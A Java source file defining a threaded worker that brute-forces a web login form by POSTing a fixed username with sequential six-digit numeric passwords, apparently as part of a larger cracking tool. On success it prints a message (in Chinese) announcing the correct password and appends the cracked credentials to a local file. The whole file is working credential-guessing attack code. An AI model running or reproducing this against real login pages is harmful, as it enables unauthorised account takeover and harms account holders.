package com.http.httptest;


import java.io.*;
import java.util.concurrent.CountDownLatch;

/**
 * @author ：clt
 * @Date ：Created in 2:11 2019/10/1
 */
public class LocalLoginRequestThread implements Runnable {

    public static final String URL = constant.LOCAL_LOGIN_URL;

    private int i;

    private CountDownLatch latch;

    public LocalLoginRequestThread(int i, CountDownLatch latch) {
        this.i = i;
        this.latch = latch;
    }

    @Override
    public void run() {
        for (int j = i; j < 100 + i; j++) {
            String str =  HttpRequestMethod.sendPost(URL, "user="+constant.USER_NAME+"&pass="+String.format("%06d",j)+"&submit=%b5%e3%bb%f7%b5%c7%c2%bc");
            if (str.charAt(9) == '2'){
                System.out.println(str);
                System.out.println("密码正确登录成功,密码为:"+j);
                File file = new File(constant.FILE_PATH);
                OutputStream os;
                try {
                    os = new FileOutputStream(file,true);
                    String data = "user:"+constant.USER_NAME+"     password:"+j;
                    os.write("\n".getBytes());
                    os.write(data.getBytes());
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            }
        }
        latch.countDown();
    }
}
